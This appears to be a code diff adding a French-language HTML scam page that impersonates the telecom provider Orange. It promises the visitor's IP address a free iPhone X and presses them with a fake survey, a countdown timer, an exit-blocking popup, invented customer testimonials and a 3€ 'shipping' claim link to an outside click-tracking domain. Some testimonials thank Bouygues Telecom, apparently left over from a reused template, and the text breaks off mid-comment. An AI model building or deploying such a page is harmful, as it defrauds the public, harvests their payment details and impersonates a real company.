@@ -1,0 +1,1188 @@
+<!DOCTYPE html><head>
+  <base href="">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	
+	<!--[if IE]></base><![endif]-->
+	<meta name="viewport" content="width=device-width,initial-scale=1">
+	<meta name="robots" content="noindex, nofollow, noarchive">
+	<title>Orange</title>
+	<link href="favicono.ico" rel="shortcut icon" sizes="16x16" type="image/x-icon">
+	<script src="jquery-3.1.0.min.js.download"></script>
+	<style>
+		* {
+			margin: 0;
+			padding: 0
+		}
+		
+		a {
+			text-decoration: none
+		}
+		
+		body {
+			font-family: arial, sans-serif;
+		}
+		
+		mark {
+			background-color: #ff9
+		}
+		
+		.survey .checkAnswers,
+		.survey .checkAnswers .step,
+		.survey .question,
+		.survey .showprize {
+			display: none
+		}
+		
+		#searchbar {
+			width: 373px;
+			height: 38px;
+			border: 2px solid #000;
+			cursor: text;
+			display: inline-block;
+			background-color: #fff
+		}
+		
+		#searchbar_button {
+			width: 75px;
+			height: 100%;
+			background-color: #000;
+			float: right;
+			color: #fff;
+			font-size: 16px;
+			font-weight: 700;
+			line-height: 38px;
+			text-align: center;
+			cursor: pointer
+		}
+		
+		#searchbar_button p {
+			display: inline
+		}
+		
+		#search_icon {
+			margin-right: 9px;
+			display: inline-block
+		}
+		
+		#header_wrapper,
+		#wrapper {
+			max-width: 800px;
+			margin: 0 auto
+		}
+		
+
+		
+		#header_wrapper h3,
+
+.b {
+	overflow: auto;
+	zoom: 1
+}		
+.r {
+	margin: 10px 0 20px;
+	padding-bottom: 10px;
+	border-bottom: 1px solid #ddd;
+	font-size: 14px;
+}
+		.r h3 {
+			float: left;
+	margin-right: 10px
+		}
+.r img {
+	float: left;
+	width: 80px;
+	height: 80px;
+	margin-right: 10px
+}
+.r table {
+	height: 80px
+}
+.r table td {
+	padding: 0 8px;
+	height: 33.3333%;
+	vertical-align: middle
+}
+.r table td:first-child {
+	font-weight: 700;
+	text-align: right
+}
+.r table td:last-child {
+	background-color: #f6f6f6
+}
+.c {
+	margin-left: auto
+}
+#header_wrapper {
+    padding-bottom: 10px;
+    border-bottom: 1px solid #EBEBEB;
+    padding-top: 10px;
+    margin-bottom: 20px;
+    color: #FF6600;
+    font-size: 30px;
+    text-rendering: optimizelegibility;
+}
+#header_logo {
+    display: inline-block;
+}
+#header_wrapper {
+    padding-left: 10px;
+    padding-right: 10px;
+}
+#header_wrapper, #wrapper {
+    max-width: 960px;
+    margin: 0 auto;
+}
+		
+		h3 {
+			display: inline-block;
+			line-height: 80px;
+			font-size: 40px
+		}
+		
+		#timer_bar {
+			height: 45px;
+			background-color: #343748;
+			color: #fff;
+			font-size: 15px;
+			line-height: 45px;
+			text-align: center
+		}
+		
+		h1 {
+			font-family: "Source Sans Pro",sans-serif;
+			font-size: 36px;
+			font-weight: 400;
+			margin-bottom: 10px
+		}
+		
+		#copy {
+			max-width: 750px;
+			margin-bottom: 20px
+		}
+		
+		#copy p {
+			font-family: "Source Sans Pro",sans-serif;
+			margin-bottom: 1em;
+			font-size: 15px
+		}
+		
+		.survey {
+			text-align: center;
+			min-height: 100px;
+			border-radius: 5px;
+			margin-bottom: 40px
+		}
+		
+		.question p {
+			font-family: "Source Sans Pro",sans-serif;
+			font-size: 32px;
+			padding: 20px 0
+		}
+		
+		.answers {
+			max-width: 621px;
+			margin: 0 auto
+		}
+		
+		.answers .answer {
+			/*color: #fff;*/
+			float: left;
+			margin-right: 20px;
+			margin-bottom: 50px
+		}
+		
+		.answers .answer,
+		.ctabutton {
+			border-radius: 3px;
+			height: 50px;
+			line-height: 50px;
+			width: 185px;
+			font-size: 20px;
+			cursor: pointer;
+			font-family: "Source Sans Pro",sans-serif
+		}
+		
+		.ctabutton {
+			/*color: #fff;*/
+			display: inline-block;
+			position: absolute;
+			right: 0;
+			text-align: center;
+			top: 25px
+		}
+		
+		.ctabutton.disabled {
+			opacity: .5;
+			background-color: #888!important;
+			border: none!important
+		}
+		
+		.prize {
+			position: relative;
+			max-width: 530px;
+			margin: 0 auto;
+			margin-bottom: 15px
+		}
+		
+		.prize,
+		.prize_copy {
+			text-align: left;
+			height: 125px
+		}
+		
+		.prize_copy {
+			display: inline-block;
+			top: 25px;
+			position: absolute;
+			line-height: 1.1em;
+			font-size: 15px
+		}
+		
+		.prize_copy .hl {
+			font-size: 16px;
+			color: #FF6600;
+			margin-bottom: 3px;
+			font-weight: 700
+		}
+		
+		.prize_image {
+			display: inline-block;
+			margin-right: 15px;
+			height: 100px;
+			width: auto
+		}
+		
+		.restant {
+			background-color: #FF6600;
+			border-radius: 2px;
+			color: #fff;
+			padding: 2px 4px;
+			display: inline-block;
+			font-size: 13px
+		}
+		
+		.restant_wrapper {
+			margin-top: 3px
+		}
+		
+		#timer {
+			color: #000
+		}
+		
+		.clear {
+			clear: both
+		}
+		
+		.checkAnswers,
+		.showprize h2 {
+			color: #FF6600;
+			padding-top: 20px;
+			font-size: 26px;
+			font-weight: 400;
+			font-family: "Source Sans Pro",sans-serif
+		}
+		
+		.showprize h2 {
+			margin-bottom: 40px!important;
+			padding: 0!important
+		}
+		
+		#limit_notice {
+			text-align: left;
+			display: inline-block;
+			margin: 0 auto;
+			font-size: 12px;
+			margin-bottom: 20px
+		}
+		
+		#limit_notice>:first-child {
+			font-weight: 700;
+			color: #FF6600;
+			font-size: 14px
+		}
+		
+		#disqus_login,
+		#disqus_recommend,
+		#disqus_share,
+		.disqus_comment.response .reply_to:before,
+		.disqus_comment_tools {
+			background-image: url("sprites.gif")
+		}
+		
+		#comments_wrapper {
+			text-align: center;
+			padding-bottom: 50px;
+			margin-bottom: 30px;
+			background-color: #fff;
+			display: none
+		}
+		
+		#comments_inner {
+			max-width: 675px;
+			margin: 0 auto
+		}
+		
+		#comments_title {
+			font-size: 26px;
+			text-align: left;
+			margin-bottom: 10px;
+			font-family: "Source Sans Pro",sans-serif
+		}
+		
+		#disqus_comment_count {
+			font-size: 15px;
+			color: #3f4549;
+			font-weight: 700
+		}
+		
+		#disqus_comment_count,
+		#disqus_recommend,
+		#disqus_share {
+			float: left
+		}
+		
+		#disqus_recommend {
+			width: 99px;
+			height: 15px;
+			background-position: 0 -21px
+		}
+		
+		#disqus_share {
+			width: 57px;
+			height: 15px;
+			background-position: -99px -21px
+		}
+		
+		#disqus_login {
+			float: right;
+			width: 85px;
+			height: 21px;
+			background-position: 0 0
+		}
+		
+		#disqus_login,
+		#disqus_recommend,
+		#disqus_share {
+			cursor: pointer
+		}
+		
+		.disqus_recommend_count {
+			float: left;
+			color: rgba(29, 47, 58, .701961);
+			font-size: 11px;
+			padding: 5px 3px;
+			background-color: rgba(0, 39, 59, .08);
+			font-weight: 700;
+			cursor: pointer;
+			border-radius: 2px;
+			line-height: 7px;
+			height: 7px;
+			margin-left: 5px;
+			margin-right: 30px
+		}
+		
+		.disqus_comment {
+			margin-top: 24px
+		}
+		
+		.disqus_hr {
+			margin: 6px 0 10px;
+			width: 100%;
+			background: url('a.gif')
+		}
+		
+		.disqus_comment .avatar {
+			width: 48px;
+			height: 48px;
+			border-radius: 3px;
+			margin-right: 12px;
+			float: left;
+			cursor: pointer;
+			background-image: url("users.jpg");
+			background-repeat: no-repeat
+		}
+		
+		.disqus_comment.a1 .avatar {
+			background-position: -144px 0
+		}
+		
+		.disqus_comment.a2 .avatar {
+			background-position: -36px -72px
+		}
+		
+		.disqus_comment.a3 .avatar {
+			background-position: -108px -72px
+		}
+		
+		.disqus_comment.a4 .avatar {
+			background-position: -96px -144px
+		}
+		
+		.disqus_comment.a5 .avatar {
+			background-position: -96px -96px
+		}
+		
+		.disqus_comment.a6 .avatar {
+			background-position: 0 -96px
+		}
+		
+		.disqus_comment.a7 .avatar {
+			background-position: -36px -72px
+		}
+		
+		.disqus_comment.a8 .avatar {
+			background-position: -144px -96px
+		}
+		
+		.disqus_comment.a9 .avatar {
+			background-position: -96px 0
+		}
+		
+		.disqus_comment.a10 .avatar {
+			background-position: 0 -36px
+		}
+		
+		.disqus_comment.a11 .avatar {
+			background-position: -48px -144px
+		}
+		
+		.disqus_comment.a12 .avatar {
+			background-position: 0 -108px
+		}
+		
+		.disqus_comment.a13 .avatar {
+			background-position: -108px -72px
+		}
+		
+		.disqus_comment.a14 .avatar {
+			background-position: -36px -108px
+		}
+		
+		.disqus_comment.a15 .avatar {
+			background-position: -108px -72px
+		}
+		
+		.disqus_comment.a16 .avatar {
+			background-position: 0 0
+		}
+		
+		.disqus_comment.a17 .avatar {
+			background-position: -144px -96px
+		}
+		
+		.disqus_comment.a18 .avatar {
+			background-position: -144px -48px
+		}
+		
+		.disqus_comment .body {
+			text-align: left
+		}
+		
+		.disqus_comment .body .header {
+			margin-bottom: 3px;
+			line-height: 1
+		}
+		
+		.disqus_comment .body .header p {
+			display: inline
+		}
+		
+		.disqus_comment .body .header .author {
+			color: #0d72c7;
+			font-size: 13px;
+			font-weight: 700;
+			cursor: pointer
+		}
+		
+		.disqus_comment .body .header .author.guest {
+			color: #777
+		}
+		
+		.disqus_comment .body .header .date {
+			color: rgba(0, 39, 59, .5);
+			font-size: 12px;
+			cursor: pointer
+		}
+		
+		.disqus_comment .body .header .date .bullet {
+			font-size: 75%
+		}
+		
+		.disqus_comment .body .content {
+			font-family: Georgia, Times, serif;
+			line-height: 21px;
+			color: #3f4549;
+			overflow: hidden
+		}
+		
+		.disqus_comment .body .footer {
+			margin-left: 60px;
+			margin-top: 4px;
+			cursor: pointer
+		}
+		
+		.disqus_comment_tools {
+			width: 157px;
+			height: 16px;
+			background-position: 0 -36px
+		}
+		
+		.disqus_load_more {
+			margin-top: 24px;
+			background-color: rgba(29, 47, 58, .6);
+			height: 36px;
+			color: #fff;
+			border-radius: 3px;
+			line-height: 36px;
+			cursor: pointer;
+			font-size: 13px;
+			font-family: Helvetica Neue, arial, sans-serif
+		}
+		
+		.disqus_load_more:hover {
+			background-color: #606d74
+		}
+		
+		.disqus_comment.response {
+			margin-left: 60px
+		}
+		
+		.disqus_comment.response .avatar {
+			width: 36px;
+			height: 36px;
+			background-size: 400% 400%
+		}
+		
+		.disqus_comment.response .reply_to:before {
+			content: "";
+			background-position: -85px 0;
+			margin-right: 3px;
+			width: 13px;
+			height: 12px;
+			display: inline-block
+		}
+		
+		.disqus_comment.response .reply_to {
+			color: rgba(0, 39, 59, .5);
+			font-size: 12px;
+			cursor: pointer
+		}
+		
+		.disqus_comment.hidden {
+			display: none
+		}
+		
+		.disabled {
+			cursor: not-allowed
+		}
+		
+		@media screen and (min-width:50px) and (max-width:640px) {
+			#header_wrapper {
+				padding: 2px 0;
+				margin-bottom: 10px
+			}
+			#copy {
+				margin-right: 10px
+			}
+			#copy,
+			#header_logo {
+				margin-left: 10px
+			}
+			.survey {
+				margin-bottom: 20px;
+				margin-left: 5px;
+				margin-right: 5px
+			}
+			.showprize h2 {
+				margin-bottom: 25px
+			}
+			.survey .answer {
+				width: 80%;
+				float: none;
+				margin: 0 auto;
+				margin-bottom: 10px
+			}
+			.ctabutton {
+				float: none;
+				width: 90%;
+				display: block;
+				top: -9px;
+				margin: 0 auto;
+				position: relative
+			}
+			#limit_notice {
+				max-width: 530px
+			}
+			.ctabutton.disabled {
+				top: 20px
+			}
+			.prize {
+				height: 180px
+			}
+			.prize_image {
+				margin-left: 20px
+			}
+			#comments_inner {
+				margin-left: 10px;
+				margin-right: 10px
+			}
+		}
+	</style>
+		<style type="text/css">@font-face{font-family:'Source Sans Pro';font-style:normal;font-weight:400;src:local('Source Sans Pro Regular'),local('SourceSansPro-Regular'),url(ODelI1aHBYDBqgeIAH2zlC2Q8seG17bfDXYR_jUsrzg.woff2) format('woff2');unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Source Sans Pro';font-style:normal;font-weight:400;src:local('Source Sans Pro Regular'),local('SourceSansPro-Regular'),url(ODelI1aHBYDBqgeIAH2zlNV_2ngZ8dMf8fLgjYEouxg.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215}#xfewew,#survey{text-align:center}*{margin:0;padding:0}a{text-decoration:none}body{font-family:"Source Sans Pro",sans-serif}#survey #check,#survey #check .s,#survey .q,#survey #sprize{display:none}#limit_notice,#xfewew,.prize_copy,.prize_image,#res{display:inline-block}#header_wrapper,#wrapper{max-width:960px;margin:0 auto}#header_wrapper{padding-bottom:10px;border-bottom:1px solid #CECECE;padding-top:10px;margin-bottom:20px;color:#FF6600;font-size:30px;text-rendering:optimizelegibility}h1{font-size:36px;font-weight:400;margin-bottom:10px}#copy{max-width:750px;margin:0 auto}#copy p{margin-bottom:1em;font-size:16px}#survey{min-height:100px;border-radius:5px;margin-bottom:40px}.q p{font-size:32px;padding:20px 0}#xfewew,.answers .answer{background-color:#FF6600;height:50px;line-height:50px;width:185px;color:#fff;font-size:19px;cursor:pointer}.answers{max-width:621px;margin:0 auto}.answers .answer{border:1px solid #FF6600;border-radius:3px;float:left;margin-right:20px;margin-bottom:50px}#xfewew{border:1px solid #FF6600;border-radius:3px}.prize,.prize_copy{height:125px;text-align:left}#xfewew.disabled{background-color:#888!important;border:none!important}.prize{position:relative;max-width:530px;margin:0 auto 15px}.prize_copy{top:25px;position:absolute;line-height:1.1em;font-size:14px}.prize_copy .hl{font-size:16px;color:#FF6600;margin-bottom:3px;font-weight:700}.prize_image{margin-right:15px}#res{background-color:#FF6600;border-radius:2px;color:#fff;padding:2px 4px;font-size:13px}.res_wrapper{margin-top:3px}#timer{color:#000}.clear{clear:both}#check,#sprize h2{color:#FF6600;padding-top:20px;font-size:26px;font-weight:400}#sprize h2{margin-bottom:40px!important;padding:0!important}#limit_notice{text-align:left;margin:0 auto 40px;font-size:15px}.cbs{font-weight:700;color:#FF6600}@media screen and (min-width:50px) and (max-width:640px){#header_wrapper{padding:5px 0;margin-bottom:10px}#survey{margin-bottom:20px;margin-left:5px;margin-right:5px}#sprize h2{margin-bottom:25px}#survey .answer{width:80%;float:none;margin:0 auto 10px}#xfewew{float:none;width:90%;display:block;margin:0 auto;position:relative!important}#limit_notice{max-width:530px}#xfewew.disabled{top:20px}.prize{height:180px}.prize_image{margin-left:20px}}#header_wrapper{padding-left:10px;padding-right:10px}#wrapper{padding:0 10px}@media screen and (max-width:640px){h1{font-size:22px}#copy p{font-size:13px}.q p{font-size:20px;padding:15px 0}#xfewew,.answers .answer{height:40px;line-height:40px;font-size:18px}.answers .answer{width:99%;float:none;margin:0 auto 10px}#sprize h2{margin-bottom:25px!important}}#xfewew{position:absolute;right:0;top:25px;text-align:center}.animated{-webkit-animation-duration:1s;animation-duration:1s;-webkit-animation-fill-mode:both;animation-fill-mode:both}@-webkit-keyframes tada{0%,to{-webkit-transform:scaleX(1);transform:scaleX(1)}10%,20%{-webkit-transform:scale3d(.9,.9,.9) rotate(-3deg);transform:scale3d(.9,.9,.9) rotate(-3deg)}30%,50%,70%,90%{-webkit-transform:scale3d(1.1,1.1,1.1) rotate(3deg);transform:scale3d(1.1,1.1,1.1) rotate(3deg)}40%,60%,80%{-webkit-transform:scale3d(1.1,1.1,1.1) rotate(-3deg);transform:scale3d(1.1,1.1,1.1) rotate(-3deg)}}@keyframes tada{0%,to{-webkit-transform:scaleX(1);transform:scaleX(1)}10%,20%{-webkit-transform:scale3d(.9,.9,.9) rotate(-3deg);transform:scale3d(.9,.9,.9) rotate(-3deg)}30%,50%,70%,90%{-webkit-transform:scale3d(1.1,1.1,1.1) rotate(3deg);transform:scale3d(1.1,1.1,1.1) rotate(3deg)}40%,60%,80%{-webkit-transform:scale3d(1.1,1.1,1.1) rotate(-3deg);transform:scale3d(1.1,1.1,1.1) rotate(-3deg)}}.tada{-webkit-animation-name:tada;animation-name:tada}.animated.fadeIn,.animated.fadeOut{-webkit-animation-duration:0.5s;animation-duration:0.5s;}@-webkit-keyframes fadeIn{from{opacity:0}to{opacity:1}}@keyframes fadeIn{from{opacity:0}to{opacity:1}}.fadeIn{-webkit-animation-name:fadeIn;animation-name:fadeIn}@-webkit-keyframes fadeOut{from{opacity:1}to{opacity:0}}@keyframes fadeOut{from{opacity:1}to{opacity:0}}.fadeOut{-webkit-animation-name:fadeOut;animation-name:fadeOut}</style>
+
+	<script>
+function getURLParameter(name) {
+    return decodeURI(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
+    );
+}
+</script>
+	<script>
+		"use strict";
+		! function ( e, t, r, n ) {
+			e._ = {
+				btn: [ "#FF6600", "#fff" ]
+			};
+			for ( var i = r.search.substr( 1 ).split( "&" ), o = 0; o < i.length; o++ ) {
+				var s = i[ o ].split( "=", 2 );
+				_[ s[ 0 ] ] = decodeURI( s[ 1 ] )
+			}
+			_.isp = "";
+			_.ip = "";
+			_.entry = 1;
+			_.audio = 1;
+			_.instructions = 1;
+			_.region="";
+			
+			var p = t.createElement( "style" );
+			e.d = function ( e ) {
+				var t = new Date( n + 864e5 * ( e || 0 ) ),
+					r = ["Dimanche", "Lundi", "Mardi", "Mercredi", "Jeudi", "Vendredi", "Samedi"][ t.getDay() ],
+					i = ["Janvier","Février","Mars","Avril","Mai","Juin","Juillet","Août","Septembre","Octobre","Novembre","Décembre"][ t.getMonth() ];
+				return r + " " + t.getDate() + " " + i + " " + t.getFullYear()
+			}, e.w = function ( e ) {
+				t.write( e || "" )
+			}
+
+			"entry" in _ && alert( "FÉLICITATIONS!\n\nNous vous remercions de votre fidélité à Orange!\n\nVotre adresse IP " + (getURLParameter("ip")) + " a été sélectionnée pour recevoir un iPhone X!\n\nDate: "+d()+"\nRéférence utilisateur: APPLE-4532-38\n "), 1 != _.safe && ( e.exitpop = !0, e.onbeforeunload = function () {
+				if ( exitpop ) return exitpop = !1, "Attendez une minute! Votre adresse IP a été sélectionnée pour recevoir un iPhone X. Ne le manquez pas!"
+			} ), _.partner && ( _.partner = " <strong>" + _.partner + "</strong>" );
+			
+			p.innerHTML = ".answers .answer, .ctabutton{background-color:" + _.btn[ 0 ] + "; color:" + _.btn[ 1 ] + "}", t.head.appendChild( p )
+			
+		}( window, document, location, +new Date )
+	</script>
+	
+			<script>
+function getURLParameter(name) {
+return decodeURI(
+(RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+);
+}
+</script>
+
+
+</head>
+
+<body>
+	<div id="header">
+		<div id="header_wrapper"><img id="header_logo" src="orange.png" ></div>
+	</div>
+
+	<div id="wrapper">
+			<div id="copy">
+				<h1>Cher client, toutes nos félicitations!</h1>
+				<p>C'est VOUS que nous tenons à remercier pour votre fidélité à Orange! Votre adresse IP <b><script>document.write(getURLParameter('ip'))</script></b> a été sélectionné pour recevoir GRATUITEMENT un <b>Apple iPhone X</b>.</p>
+				<p>De temps à autre, nous choisissons au hasard quelques clients chanceux de Orange et nous leur faisons cadeau d'articles de valeur pour les remercier de nous avoir choisis comme leur fournisseur d'accès à Internet.</p>
+				<p>Aujourd'hui c'est VOTRE jour de chance! Vous êtes l'un des 10 clients chanceux sélectionnés au hasard qui vont recevoir GRATUITEMENT un iPhone X de notre partenaire <b>Apple</b>.</p>
+				<p>Pour recevoir votre cadeau, il vous suffit de répondre à notre sondage anonyme. Mais dépêchez-vous! Il ne reste qu'un nombre limité de cadeaux pour aujourd'hui!</p>
+			</div>
+			<div class="survey">
+				<div style="display: block;" class="question q-1">
+					<p>Êtes-vous satisfait par Orange?</p>
+					<div class="answers">
+						<div class="first answer">Très satisfait</div>
+						<div class="second answer">Satisfait</div>
+						<div class="third answer">Insatisfait</div>
+						<div class="clear"></div>
+					</div>
+				</div>
+
+				<div class="question q-2">
+					<p>Recommanderiez-vous Orange?</p>
+					<div class="answers">
+						<div class="first answer">Oui</div>
+						<div class="second answer">Non</div>
+						<div class="third answer">Peut-être</div>
+						<div class="clear"></div>
+					</div>
+				</div>
+
+				<div class="question q-3">
+					<p>Que préférez-vous chez Orange?</p>
+					<div class="answers">
+						<div class="first answer">La rapidité</div>
+						<div class="second answer">Les services</div>
+						<div class="third answer">Le prix</div>
+						<div class="clear"></div>
+					</div>
+				</div>
+
+				<div class="checkAnswers">
+					<div class="step s-1">Validation de vos réponses...</div>
+					<div class="step s-2">Vérification de votre IP...</div>
+					<div class="step s-3">Vérification si les prix sont toujours disponibles...</div>
+				</div>
+			<div class="showprize">
+				<h2>Félicitations!</h2>
+					<div id="limit_notice">
+						<p>En raison de l'offre limitée, votre récompense a été réservée pour les <span id="timer"><span id="minutes">2</span>:<span id="seconds">59</span></span> prochaines minutes.</p>
+						<p>Si vous ne réclamez pas votre récompense durant cette période, elle sera donnée au prochain client chanceux Orange.</p>
+					</div>
+				<div class="prize"><img class="prize_image" src="xxx.png">
+					<div class="prize_copy">
+						<p class="hl">Apple iPhone X</p>
+
+						<p>Votre prix:
+							<span style="color: green; font-weight: bold">
+								3€</span> (frais de livraison)</p>
+						<p class="restant_wrapper"><b>Restant: <span class="restant blinking">2</span></b>
+						</p>
+					</div>
+					<a href="https://seates-clable.com/click">
+						<div id="cta" class="ctabutton">Réclamer (3€)</div>
+					</a>
+				</div>
+
+
+			</div>
+		</div>
+			<div id="comments_wrapper">
+				<div id="comments_inner">
+					<p id="comments_title">Commentaires clients:</p>
+					<div id="disqus_header">
+						<p id="disqus_comment_count">127 Comments</p>
+						<div id="disqus_login"></div>
+						<div class="clear"></div>
+						<img class="disqus_hr" src="disqus_hr.gif">
+						<div id="disqus_recommend"></div>
+						<div class="disqus_recommend_count">67</div>
+						<div id="disqus_share"></div>
+						<div class="clear"></div>
+					</div>
+					<div id="disqus_body">
+						<div class="disqus_comment a1">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author">Marie Martin</p>
+									<p class="date"><span class="bullet"> • </span>16 minutes ago</p>
+								</div>
+								<div class="content">
+									<p>Merci beaucoup, c'est tout simplement fantastique, je n'avais jamais gagné quoi que ce soit en ligne auparavant! Bouygues Telecom est le meilleure entreprise du monde!</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a2 response">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author">Karen Blanc</p>
+									<p class="reply_to">Marie Martin</p>
+									<p class="date"><span class="bullet"> • </span>7 minutes ago</p>
+								</div>
+								<div class="content">
+									<p>Bravo! Cela m'a pris 10 minutes pour répondre à toutes les questions parce que j'avais peur de cliquer sur la mauvaise et de ne rien recevoir. J'ai reçu mon iPhone X ce matin. yeah :)</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a3 response">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author guest">Alan Leroy</p>
+									<p class="reply_to">Karen Blanc</p>
+									<p class="date"><span class="bullet"> • </span>a few seconds ago</p>
+								</div>
+								<div class="content">
+									<p>J'ai reçu un iPhone X, cela vaut bien plus qu'un samsung :P</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a4">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author">Marion Verreault</p>
+									<p class="date"><span class="bullet"> • </span>18 minutes ago</p>
+								</div>
+								<div class="content">
+									<p>Ohh, plus de montres apple! Okay, un iphone fera l'affaire :)</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a5">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author">Jacob Morel</p>
+									<p class="date"><span class="bullet"> • </span>23 minutes ago</p>
+								</div>
+								<div class="content">
+									<p>Vous êtes incroyables! Merci de faire ça!</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a6">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author">Daniel Abbey</p>
+									<p class="date"><span class="bullet"> • </span>27 minutes ago</p>
+								</div>
+								<div class="content">
+									<p>C'est la première fois que je gagne quelque chose! Haha!</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a7 response">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author">Karen Blanc</p>
+									<p class="reply_to">Daniel Abbey</p>
+									<p class="date"><span class="bullet"> • </span>3 minutes ago</p>
+								</div>
+								<div class="content">
+									<p>Je sais :)</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a8">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author guest">Francis Petit</p>
+									<p class="date"><span class="bullet"> • </span>25 minutes ago</p>
+								</div>
+								<div class="content">
+									<p>OUI j'ai gagné! Mon cadeau est un iPhone X!
+</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a9">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author">Juliette Brideau</p>
+									<p class="date"><span class="bullet"> • </span>31 minutes ago</p>
+								</div>
+								<div class="content">
+									<p>Montre de sport Apple :3 merci!</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a10 response">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author">Isabelle Desjardins</p>
+									<p class="reply_to">Juliette Brideau</p>
+									<p class="date"><span class="bullet"> • </span>16 minutes ago</p>
+								</div>
+								<div class="content">
+									<p>Super, j'ai reçu un iPhone X hier mais je pense que l'écran est trop grand pour rentrer dans ma poche de jean lol</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a11 hidden">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author">Julien Leblanc</p>
+									<p class="date"><span class="bullet"> • </span>46 minutes ago</p>
+								</div>
+								<div class="content">
+									<p>qui d'autre a vu cette page sur Facebook?</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a12 response hidden">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author">Cassandra Domecq</p>
+									<p class="reply_to">Julien Leblanc</p>
+									<p class="date"><span class="bullet"> • </span>43 minutes ago</p>
+								</div>
+								<div class="content">
+									<p>Moi! Mon ami a gagné un iPhone X, j'ai seulement eu un Samsung Galaxy mais j'en ai déjà un :( Je sais maintenant ce que je vais offrir à ma sœur pour son anniversaire xD</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a13 response hidden">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author guest">PHANTOM</p>
+									<p class="reply_to">Julien Leblanc</p>
+									<p class="date"><span class="bullet"> • </span>43 minutes ago</p>
+								</div>
+								<div class="content">
+									<p>Est-ce que c'est l'un de ces vieux appareils photo? Lol, tu ne peux pas t'offrir un smartphone? J'espère que tu gagneras ici aussi</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a14 response hidden">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author">Julien Leblanc</p>
+									<p class="reply_to">PHANTOM</p>
+									<p class="date"><span class="bullet"> • </span>10 minutes ago</p>
+								</div>
+								<div class="content">
+									<p>Haha j'étais en vacances et je n'avais pas mon téléphone. Et ouais, j'ai gagné un iphone c'est trop cool ;)</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a15 response hidden">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author guest">PHANTOM</p>
+									<p class="reply_to">Julien Leblanc</p>
+									<p class="date"><span class="bullet"> • </span>5 minutes ago</p>
+								</div>
+								<div class="content">
+									<p>C'est cool mec :D</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a16 hidden">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author">Lisa Marie</p>
+									<p class="date"><span class="bullet"> • </span>1 hour ago</p>
+								</div>
+								<div class="content">
+									<p>Oh mon dieu!!! Est-ce que je viens vraiment de gagner un iPhone X??? Je suis tellement content! Merci Bouygues Telecom!</p>
+								</div>
+								<div class="footer">
+									<div class="disqus_comment_tools"></div>
+								</div>
+							</div>
+							<div class="clear"></div>
+						</div>
+						<div class="disqus_comment a17 hidden">
+							<div class="avatar"></div>
+							<div class="body">
+								<div class="header">
+									<p class="author guest">Gilbert Thomas</p>
+									<p class="date"><span class="bullet"> • </span>1 hour ago</p>
+								</div>
+								<div class="content">
